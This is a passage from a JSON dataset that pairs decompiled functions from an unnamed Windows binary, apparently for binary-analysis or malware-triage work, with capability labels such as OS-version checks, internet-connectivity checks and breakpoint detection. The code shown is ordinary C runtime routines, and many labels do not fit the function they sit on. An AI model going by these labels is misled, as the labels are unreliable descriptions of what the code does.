*(in_EAX * 4 + 0x4648e4);\n            }\n            if (iVar1 < iVar5) {\n                iVar5 = iVar5 + -7;\n            }\n        }\n    }\n    else {\n        if (((iVar2 == 0) && (iVar1 = arg_10h / 100,  arg_10h % 100 != 0)) ||\n           (iVar1 = (arg_10h + 0x76c) / 400,  (arg_10h + 0x76c) % 400 == 0)) {\n            iVar5 = *(in_EAX * 4 + 0x4648ac);\n        }\n        else {\n            iVar5 = *(in_EAX * 4 + 0x4648e0);\n        }\n        iVar5 = iVar5 + arg_1ch;\n    }\n    iVar2 = (in_ECX * 0x3c + arg_20h) * 0x3c;\n    if (arg_8h == 1) {\n        *0x4648a0 = (iVar2 + arg_24h) * 1000 + arg_28h;\n        *0x464898 = arg_10h;\n        *0x46489c = iVar5;\n    }\n    else {\n        *0x4648ac = (iVar2 + *0x464808 + arg_24h) * 1000 + arg_28h;\n        if (*0x4648ac < 0) {\n            *0x4648ac = *0x4648ac + 86400000;\n            *0x4648a8 = iVar5 + -1;\n        }\n        else {\n            iVar1 = 86400000;\n            *0x4648a8 = iVar5;\n            if (86399999 < *0x4648ac) {\n                *0x4648ac = *0x4648ac + -86400000;\n                *0x4648a8 = iVar5 + 1;\n            }\n        }\n        *0x4648a4 = arg_10h;\n    }\n    return iVar1;\n}\n",
        "token_count": 947
    },
    "0041ae25": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t fcn.0041ae25(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = fcn.00414501();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x46466c) {\n        iVar1 = fcn.00419574();\n    }\n    if (1 < *(iVar1 + 0x28)) {\n        uVar2 = fcn.004191e8(iVar1, param_1, 4);\n        return uVar2;\n    }\n    return *(*(iVar1 + 0x48) + param_1 * 2) & 4;\n}\n",
        "token_count": 155
    },
    "0041ae5f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t fcn.0041ae5f(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = fcn.00414501();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x46466c) {\n        iVar1 = fcn.00419574();\n    }\n    if (1 < *(iVar1 + 0x28)) {\n        uVar2 = fcn.004191e8(iVar1, param_1, 0x80);\n        return uVar2;\n    }\n    return *(*(iVar1 + 0x48) + param_1 * 2) & 0x80;\n}\n",
        "token_count": 160
    },
    "0041ae9e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t fcn.0041ae9e(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = fcn.00414501();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x46466c) {\n        iVar1 = fcn.00419574();\n    }\n    if (1 < *(iVar1 + 0x28)) {\n        uVar2 = fcn.004191e8(iVar1, param_1, 8);\n        return uVar2;\n    }\n    return *(*(iVar1 + 0x48) + param_1 * 2) & 8;\n}\n",
        "token_count": 156
    },
    "0041b110": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0041b110(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t in_ECX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint noname_3;\n    uint unaff_retaddr;\n    uint in_stack_0000000c;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint in_stack_0000002c;\n    uint in_stack_00000030;\n    uint in_stack_00000034;\n    uint32_t var_4h;\n    \n    uVar2 = arg_ch;\n    uVar1 = arg_8h;\n    if ((*(arg_8h + 0x14) == 0) || ((*(arg_8h + 0x24) != 0 && (arg_ch < 0x80)))) {\n        if ((0x40 < arg_ch) && (arg_ch < 0x5b)) {\n            return arg_ch + 0x20;\n        }\n    }\n    else {\n        noname_3 = 1;\n        var_4h = in_ECX;\n        if (arg_ch < 0x100) {\n            if (*(arg_8h + 0x28) < 2) {\n                uVar3 = *(*(arg_8h + 0x48) + arg_ch * 2) & 1;\n            }\n            else {\n                uVar3 = fcn.004191e8(arg_8h, arg_ch, 1);\n            }\n            if (uVar3 == 0) {\n                return uVar2;\n            }\n        }\n        if ((*(*(uVar1 + 0x48) + 1 + (uVar2 >> 8 & 0xffU) * 2) & 0x80) == 0) {\n            arg_8h = arg_8h & 0xffff0000 | uVar2 & 0xff;\n        }\n        else {\n            arg_8h = arg_8h & 0xff000000 | CONCAT11(uVar2, uVar2 >> 8);\n            noname_3 = 2;\n        }\n        iVar4 = fcn.00419da8(*(uVar1 + 0x14), 0x100, &arg_8h, noname_3, &var_4h, 3, *(uVar1 + 4), 1, unaff_EDI, \n                             unaff_ESI, unaff_EBX, var_4h, unaff_EBP, unaff_retaddr, arg_8h, arg_ch, in_stack_0000000c, \n                             in_stack_00000010, in_stack_00000014, in_stack_00000018, in_stack_0000001c, \n                             in_stack_00000020, in_stack_00000024, in_stack_00000028, in_stack_0000002c, \n                             in_stack_00000030, in_stack_00000034);\n        if (iVar4 != 0) {\n            if (iVar4 != 1) {\n                return CONCAT11(var_4h, var_4h._1_1_);\n            }\n            return var_4h & 0xff;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 838
    },
    "0041b1fa": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0041b1fa(int32_t param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    \n    iVar2 = param_2 / 0x20;\n    uVar1 = *(param_1 + iVar2 * 4) & ~(-1 << (0x1fU - param_2 % 0x20 & 0x1f));\n    while( true ) {\n        if (uVar1 != 0) {\n            return 0;\n        }\n        iVar2 = iVar2 + 1;\n        if (2 < iVar2) break;\n        uVar1 = *(param_1 + iVar2 * 4);\n    }\n    return 1;\n}\n",
        "token_count": 165
    },
    "0041b32b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b32b(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint8_t uVar3;\n    uint *puVar4;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar3 = arg_ch % 0x20;\n    iVar2 = 0;\n    var_4h = 0;\n    do {\n        uVar1 = *(arg_8h + iVar2 * 4);\n        *(arg_8h + iVar2 * 4) = uVar1 >> (uVar3 & 0x1f) | var_4h;\n        var_4h = (uVar1 & ~(-1 << (uVar3 & 0x1f))) << (0x20 - uVar3 & 0x1f);\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 3);\n    iVar2 = 2;\n    puVar4 = arg_8h + (2 - arg_ch / 0x20) * 4;\n    do {\n        if (iVar2 < arg_ch / 0x20) {\n            *(arg_8h + iVar2 * 4) = 0;\n        }\n        else {\n            *(arg_8h + iVar2 * 4) = *puVar4;\n        }\n        iVar2 = iVar2 + -1;\n        puVar4 = puVar4 + -1;\n    } while (-1 < iVar2);\n    return;\n}\n",
        "token_count": 353
    },
    "0041bad2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t fcn.0041bad2(uint32_t param_1, char **param_2)\n\n{\n    char *pcVar1;\n    \n    if (param_1 != 0xffffffff) {\n        pcVar1 = param_2[3];\n        if (((pcVar1 & 1) != 0) || ((pcVar1 < '\\0' && ((pcVar1 & 2) == 0)))) {\n            if (param_2[2] == NULL) {\n                fcn.0041c012(param_2);\n            }\n            if (*param_2 == param_2[2]) {\n                if (param_2[1] != NULL) {\n                    return 0xffffffff;\n                }\n                *param_2 = *param_2 + 1;\n            }\n            *param_2 = *param_2 + -1;\n            pcVar1 = *param_2;\n            if ((*(param_2 + 3) & 0x40) == 0) {\n                *pcVar1 = param_1;\n            }\n            else if (*pcVar1 != param_1) {\n                *param_2 = pcVar1 + 1;\n                return 0xffffffff;\n            }\n            param_2[1] = param_2[1] + 1;\n            param_2[3] = param_2[3] & 0xffffffef | 1;\n            return param_1 & 0xff;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 325
    },
    "0041bb83": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041bb83(int32_t arg_8h, uint16_t *lpWideCharStr, uint8_t *arg_10h, uint32_t arg_14h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    \n    if ((arg_10h != NULL) && (arg_14h != 0)) {\n        uVar1 = *arg_10h;\n        if (uVar1 != 0) {\n            if (*(arg_8h + 0x14) == 0) {\n                if (lpWideCharStr != NULL) {\n                    *lpWideCharStr = uVar1;\n                }\n                return 1;\n            }\n            if ((*(*(arg_8h + 0x48) + 1 + uVar1 * 2) & 0x80) == 0) {\n                iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                                  (*(arg_8h + 4), 9, arg_10h, 1, lpWideCharStr, lpWideCharStr != NULL);\n                if (iVar2 != 0) {\n                    return 1;\n                }\n            }\n            else {\n                iVar2 = *(arg_8h + 0x28);\n                if ((((1 < iVar2) && (iVar2 <= arg_14h)) &&\n                    (iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                                       (*(arg_8h + 4), 9, arg_10h, iVar2, lpWideCharStr, lpWideCharStr != NULL), \n                    iVar2 != 0)) || ((*(arg_8h + 0x28) <= arg_14h && (arg_10h[1] != 0)))) {\n                    return *(arg_8h + 0x28);\n                }\n            }\n            puVar3 = fcn.004131f5();\n            *puVar3 = 0x2a;\n            return 0xffffffff;\n        }\n        if (lpWideCharStr != NULL) {\n            *lpWideCharStr = 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 479
    },
    "0041c315": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041c315(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_4h;\n    \n    fcn.00412580(0x456df8, 0x10);\n    if (*0x4674b4 == NULL) {\n        if (*0x467088 != 1) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"kernel32.dll\");\n            if (iVar2 != 0) {\n                *0x4674b4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"InitializeCriticalSectionAndSpinCount\");\n                if (*0x4674b4 != NULL) goto code_r0x0041c361;\n            }\n        }\n        *0x4674b4 = 0x41c305;\n    }\ncode_r0x0041c361:\n    pcVar1 = *0x4674b4;\n    *(unaff_EBP + -4) = 0;\n    uVar3 = (*pcVar1)(*(unaff_EBP + 8), *(unaff_EBP + 0xc));\n    *(unaff_EBP + -0x20) = uVar3;\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.004125bb();\n    return;\n}\n",
        "token_count": 340
    },
    "0041c3a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0041c3a0(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = 0;\n    if (*0x4674b8 == NULL) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"user32.dll\");\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if ((iVar2 == 0) || (*0x4674b8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x456e5c),  *0x4674b8 == NULL))\n        {\n            return 0;\n        }\n        *0x4674bc = (*pcVar1)(iVar2, 0x456e4c);\n        *0x4674c0 = (*pcVar1)(iVar2, 0x456e38);\n        if ((*0x467088 == 2) && (*0x4674c8 = (*pcVar1)(iVar2, \"GetUserObjectInformationA\"),  *0x4674c8 != NULL)) {\n            *0x4674c4 = (*pcVar1)(iVar2, \"GetProcessWindowStation\");\n        }\n    }\n    if ((*0x4674c4 == NULL) ||\n       (((iVar2 = (**0x4674c4)(),  iVar2 != 0 && (iVar2 = (**0x4674c8)(iVar2, 1, &var_10h, 0xc, &var_4h),  iVar2 != 0))\n        && ((var_8h & 1) != 0)))) {\n        if (((*0x4674bc != NULL) && (iVar4 = (**0x4674bc)(),  iVar4 != 0)) && (*0x4674c0 != NULL)) {\n            iVar4 = (**0x4674c0)(iVar4);\n        }\n    }\n    else if (*0x467094 < 4) {\n        arg_10h = arg_10h | 0x40000;\n    }\n    else {\n        arg_10h = arg_10h | 0x200000;\n    }\n    uVar3 = (**0x4674b8)(iVar4, arg_8h, arg_ch, arg_10h);\n    return uVar3;\n}\n",
        "token_count": 572
    },
    "0041c5c4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0041c5c4(uint8_t param_1, uint32_t param_2, uint8_t param_3)\n\n{\n    if ((*(param_1 + 0x468721) & param_3) == 0) {\n        if (param_2 == 0) {\n            param_2 = 0;\n        }\n        else {\n            param_2 = *(*0x46495c + param_1 * 2) & param_2;\n        }\n        if (param_2 == 0) {\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 133
    },
    "0041cc0d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041cc0d(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    char in_AL;\n    int32_t iVar1;\n    int32_t *in_ECX;\n    int32_t *unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    uint noname_1;\n    \n    if (in_AL < '[') {\n        if (in_AL == 'Z') {\ncode_r0x0041cdfe:\n            fcn.0041abf2();\ncode_r0x0041ce63:\n            fcn.0041cb3e();\n            return 1;\n        }\n        if (in_AL < 'N') {\n            if (in_AL != 'M') {\n                if (in_AL == '%') {\n                    **in_ECX = 0x25;\n                    *in_ECX = *in_ECX + 1;\n                    *unaff_EBX = *unaff_EBX + -1;\n                    return 1;\n                }\n                if ((in_AL == 'A') || (in_AL == 'B')) goto code_r0x0041ce63;\n                if ((in_AL != 'H') && (in_AL != 'I')) {\n                    return 1;\n                }\n            }\ncode_r0x0041ccd5:\n            fcn.0041cb94(arg_14h);\n            return 1;\n        }\n        if (((in_AL == 'S') || (in_AL == 'U')) || (in_AL == 'W')) goto code_r0x0041ccd5;\n        if (in_AL != 'X') {\n            if (in_AL != 'Y') {\n                return 1;\n            }\n            goto code_r0x0041ccd5;\n        }\n    }\n    else {\n        if ('m' < in_AL) {\n            if (in_AL == 'p') goto code_r0x0041ce63;\n            if (in_AL == 'w') goto code_r0x0041ccd5;\n            if (in_AL == 'x') {\n                if (arg_14h == 0) {\n                    noname_1 = 0;\n                }\n                else {\n                    noname_1 = 1;\n                }\n                goto code_r0x0041ccea;\n            }\n            if (in_AL == 'y') goto code_r0x0041ccd5;\n            if (in_AL != 'z') {\n                return 1;\n            }\n            goto code_r0x0041cdfe;\n        }\n        if (in_AL == 'm') goto code_r0x0041ccd5;\n        if ((in_AL == 'a') || (in_AL == 'b')) goto code_r0x0041ce63;\n        if (in_AL != 'c') {\n            if ((in_AL != 'd') && (in_AL != 'j')) {\n                return 1;\n            }\n            goto code_r0x0041ccd5;\n        }\n        iVar1 = fcn.0041ce73(arg_8h, arg_14h != 0, arg_ch, in_ECX, unaff_EBX, arg_10h, unaff_EDI, unaff_ESI, unaff_EBP, \n                             unaff_retaddr, arg_8h, arg_ch, arg_10h, arg_14h);\n        if (iVar1 == 0) {\n            return 0;\n        }\n        if (*unaff_EBX == 0) {\n            return 0;\n        }\n        **in_ECX = 0x20;\n        *in_ECX = *in_ECX + 1;\n        *unaff_EBX = *unaff_EBX + -1;\n    }\n    noname_1 = 2;\ncode_r0x0041ccea:\n    iVar1 = fcn.0041ce73(arg_8h, noname_1, arg_ch, in_ECX, unaff_EBX, arg_10h, unaff_EDI, unaff_ESI, unaff_EBP, \n                         unaff_retaddr, arg_8h, arg_ch, arg_10h, arg_14h);\n    if (iVar1 != 0) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 938
    },
    "0041ce73": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_42h\n\nvoid __cdecl\nfcn.0041ce73(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint8_t uVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    uint32_t *puVar4;\n    uint8_t **ppuVar5;\n    uint uVar6;\n    code *pcVar7;\n    int32_t iVar8;\n    uint *arg_8h_00;\n    char *pcVar9;\n    int32_t iVar10;\n    char cVar11;\n    uint8_t *puVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    ushort *puVar15;\n    int32_t unaff_EBP;\n    uint var_19h;\n    uint var_10h;\n    uint var_14h;\n    uint var_18h_2;\n    uint var_4h;\n    uint var_54h_2;\n    uint var_48h_2;\n    uint var_42h_2;\n    uint var_38h;\n    uint var_54h;\n    uint var_30h_2;\n    uint var_2ch_2;\n    uint var_48h;\n    uint var_42h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    \n    var_20h = 0x38;\n    var_24h = 0x456fb0;\n    fcn.00412580();\n    if (*(unaff_EBP + 0xc) == 0) {\n        uVar6 = *(*(unaff_EBP + 0x1c) + 0xa0);\n    }\n    else if (*(unaff_EBP + 0xc) == 1) {\n        uVar6 = *(*(unaff_EBP + 0x1c) + 0xa4);\n    }\n    else {\n        uVar6 = *(*(unaff_EBP + 0x1c) + 0xa8);\n    }\n    *(unaff_EBP + -0x20) = uVar6;\n    if (*(*(unaff_EBP + 0x1c) + 0xb0) == 1) {\n        puVar15 = *(unaff_EBP + 0x10);\n    }\n    else {\n        pcVar7 = _sym.imp.KERNEL32.dll_GetDateFormatA;\n        if (*(unaff_EBP + 0xc) == 2) {\n            pcVar7 = _sym.imp.KERNEL32.dll_GetTimeFormatA;\n        }\n        *(unaff_EBP + -0x30) = pcVar7;\n        puVar15 = *(unaff_EBP + 0x10);\n        *(unaff_EBP + -0x48) = puVar15[10] + 0x76c;\n        *(unaff_EBP + -0x46) = puVar15[8] + 1;\n        *(unaff_EBP + -0x42) = puVar15[6];\n        *(unaff_EBP + -0x40) = puVar15[4];\n        *(unaff_EBP + -0x3e) = puVar15[2];\n        *(unaff_EBP + -0x3c) = *puVar15;\n        *(unaff_EBP + -0x3a) = 0;\n        arg_8h_00 = &fcn.0041ce73::var_24h;\n        iVar8 = (*pcVar7)(*(*(unaff_EBP + 0x1c) + 0xac), 0, unaff_EBP + -0x48, *(unaff_EBP + -0x20), 0, 0);\n        *(unaff_EBP + -0x2c) = iVar8;\n        if (iVar8 != 0) {\n            *(unaff_EBP + -0x34) = 0;\n            *(unaff_EBP + -4) = 0;\n            fcn.004112a0();\n            *(unaff_EBP + -0x18) = &fcn.0041ce73::var_24h;\n            *(unaff_EBP + -0x38) = &fcn.0041ce73::var_24h;\n            *(unaff_EBP + -4) = 0xffffffff;\n            if (*0x10 == 0x8) {\n                arg_8h_00 = fcn.0041101f(*(unaff_EBP + -0x2c));\n                if (arg_8h_00 == NULL) goto code_r0x0041cfd3;\n                *(unaff_EBP + -0x34) = 1;\n            }\n            *(unaff_EBP + -0x24) = arg_8h_00;\n            iVar8 = (**(unaff_EBP + -0x30))\n                              (*(*(unaff_EBP + 0x1c) + 0xac), 0, unaff_EBP + -0x48, *(unaff_EBP + -0x20), arg_8h_00, \n                               *(unaff_EBP + -0x2c));\n            iVar8 = iVar8 + -1;\n            if (0 < iVar8) {\n                piVar2 = *(unaff_EBP + 0x18);\n                piVar3 = *(unaff_EBP + 0x14);\n                do {\n                    if (*piVar2 == 0) break;\n                    **piVar3 = **(unaff_EBP + -0x24);\n                    *piVar3 = *piVar3 + 1;\n                    *(unaff_EBP + -0x24) = *(unaff_EBP + -0x24) + 1;\n                    *piVar2 = *piVar2 + -1;\n                    iVar8 = iVar8 + -1;\n                } while (0 < iVar8);\n            }\n            if (*(unaff_EBP + -0x34) != 0) {\n                fcn.00411031(arg_8h_00);\n            }\n            goto code_r0x0041cfc7;\n        }\n    }\ncode_r0x0041cfd3:\n    cVar11 = **(unaff_EBP + -0x20);\n    if (cVar11 != '\\0') {\n        puVar4 = *(unaff_EBP + 0x18);\n        ppuVar5 = *(unaff_EBP + 0x14);\n        while (*puVar4 != 0) {\n            *(unaff_EBP + -0x19) = 0;\n            *(unaff_EBP + -0x28) = 0;\n            pcVar9 = *(unaff_EBP + -0x20);\n            uVar14 = 0;\n            do {\n                uVar13 = uVar14;\n                pcVar9 = pcVar9 + 1;\n                uVar14 = uVar13 + 1;\n            } while (*pcVar9 == cVar11);\n            *(unaff_EBP + -0x24) = pcVar9;\n            if (cVar11 < 'e') {\n                if (cVar11 == 'd') {\n                    if (uVar13 == 0) {\n                        *(unaff_EBP + -0x28) = 1;\n                    }\n                    else if (uVar13 != 1) {\n                        if (uVar13 == 2) {\n                            *(unaff_EBP + -0x19) = 0x61;\n                        }\n                        else if (uVar13 == 3) {\n                            *(unaff_EBP + -0x19) = 0x41;\n                        }\n                        goto code_r0x0041d28b;\n                    }\n                    *(unaff_EBP + -0x19) = 100;\n                    goto code_r0x0041d28b;\n                }\n                if (cVar11 != '\\'') {\n                    if (cVar11 != 'A') {\n                        if (cVar11 == 'H') {\n                            if (uVar13 == 0) {\n                                *(unaff_EBP + -0x28) = 1;\n                            }\n                            else if (uVar14 != 2) goto code_r0x0041d28b;\n                            *(unaff_EBP + -0x19) = 0x48;\n                        }\n                        else if (cVar11 == 'M') {\n                            if (uVar13 == 0) {\n                                *(unaff_EBP + -0x28) = 1;\n                            }\n                            else if (uVar13 != 1) {\n                                if (uVar13 == 2) {\n                                    *(unaff_EBP + -0x19) = 0x62;\n                                }\n                                else if (uVar13 == 3) {\n                                    *(unaff_EBP + -0x19) = 0x42;\n                                }\n                                goto code_r0x0041d28b;\n                            }\n                            *(unaff_EBP + -0x19) = 0x6d;\n                        }\n                        else if (cVar11 == 'a') goto code_r0x0041d034;\n                        goto code_r0x0041d28b;\n                    }\ncode_r0x0041d034:\n                    iVar8 = *(unaff_EBP + -0x20);\n                    iVar10 = fcn.00420590(iVar8, \"am/pm\");\n                    if (iVar10 == 0) {\n                        iVar8 = iVar8 + 5;\ncode_r0x0041d0b2:\n                        *(unaff_EBP + -0x24) = iVar8;\n                    }\n                    else {\n                        iVar10 = fcn.00420590(iVar8, 0x456fa0);\n                        if (iVar10 == 0) {\n                            iVar8 = iVar8 + 3;\n                            goto code_r0x0041d0b2;\n                        }\n                    }\n                    *(unaff_EBP + -0x19) = 0x70;\n                    goto code_r0x0041d28b;\n                }\n                *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + uVar14;\n                if ((uVar14 & 1) != 0) {\n                    puVar12 = *(unaff_EBP + -0x20);\n                    while( true ) {\n                        uVar1 = *puVar12;\n                        if ((uVar1 == 0) || (*puVar4 == 0)) goto code_r0x0041d2eb;\n                        if (uVar1 == 0x27) break;\n                        if (((*(*(*(unaff_EBP + 8) + 0x48) + 1 + uVar1 * 2) & 0x80) == 0) || (*puVar4 < 2)) {\n                            puVar12 = *(unaff_EBP + -0x20);\n                        }\n                        else {\n                            puVar12 = *(unaff_EBP + -0x20) + 1;\n                            if (*puVar12 == 0) goto code_r0x0041cfc7;\n                            **ppuVar5 = uVar1;\n                            *ppuVar5 = *ppuVar5 + 1;\n                            *puVar4 = *puVar4 - 1;\n                        }\n                        **ppuVar5 = *puVar12;\n                        *ppuVar5 = *ppuVar5 + 1;\n                        puVar12 = puVar12 + 1;\n                        *(unaff_EBP + -0x20) = puVar12;\n                        *puVar4 = *puVar4 - 1;\n                    }\n                    *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + 1;\n                }\n            }\n            else {\n                if (cVar11 == 'h') {\n                    if (uVar13 == 0) {\n                        *(unaff_EBP + -0x28) = 1;\n                    }\n                    else if (uVar14 != 2) goto code_r0x0041d28b;\n                    *(unaff_EBP + -0x19) = 0x49;\ncode_r0x0041d28b:\n                    if (*(unaff_EBP + -0x19) == '\\0') {\n                        puVar12 = *(unaff_EBP + -0x20);\n                        uVar1 = *puVar12;\n                        if (((*(*(*(unaff_EBP + 8) + 0x48) + 1 + uVar1 * 2) & 0x80) != 0) && (1 < *puVar4)) {\n                            puVar12 = puVar12 + 1;\n                            if (*puVar12 == 0) break;\n                            **ppuVar5 = uVar1;\n                            *ppuVar5 = *ppuVar5 + 1;\n                            *puVar4 = *puVar4 - 1;\n                        }\n                        **ppuVar5 = *puVar12;\n                        *ppuVar5 = *ppuVar5 + 1;\n                        *(unaff_EBP + -0x20) = puVar12 + 1;\n                        *puVar4 = *puVar4 - 1;\n                        goto code_r0x0041d2eb;\n                    }\n                    iVar8 = fcn.0041cc0d(*(unaff_EBP + 8), *(unaff_EBP + 0x10), *(unaff_EBP + 0x1c), \n                                         *(unaff_EBP + -0x28));\n                    if (iVar8 == 0) break;\n                }\n                else {\n                    if (cVar11 == 'm') {\n                        if (uVar13 == 0) {\n                            *(unaff_EBP + -0x28) = 1;\n                        }\n                        else if (uVar14 != 2) goto code_r0x0041d28b;\n                        *(unaff_EBP + -0x19) = 0x4d;\n                        goto code_r0x0041d28b;\n                    }\n                    if (cVar11 == 's') {\n                        if (uVar13 == 0) {\n                            *(unaff_EBP + -0x28) = 1;\n                        }\n                        else if (uVar14 != 2) goto code_r0x0041d28b;\n                        *(unaff_EBP + -0x19) = 0x53;\n                        goto code_r0x0041d28b;\n                    }\n                    if (cVar11 != 't') {\n                        if (cVar11 == 'y') {\n                            if (uVar13 == 1) {\n                                *(unaff_EBP + -0x19) = 0x79;\n                            }\n                            else if (uVar13 == 3) {\n                                *(unaff_EBP + -0x19) = 0x59;\n                            }\n                        }\n                        goto code_r0x0041d28b;\n                    }\n                    if (*(puVar15 + 4) < 0xc) {\n                        puVar12 = *(*(unaff_EBP + 0x1c) + 0x98);\n                    }\n                    else {\n                        puVar12 = *(*(unaff_EBP + 0x1c) + 0x9c);\n                    }\n                    if ((uVar14 == 1) && (*puVar4 != 0)) {\n                        uVar1 = *puVar12;\n                        if (((*(*(*(unaff_EBP + 8) + 0x48) + 1 + uVar1 * 2) & 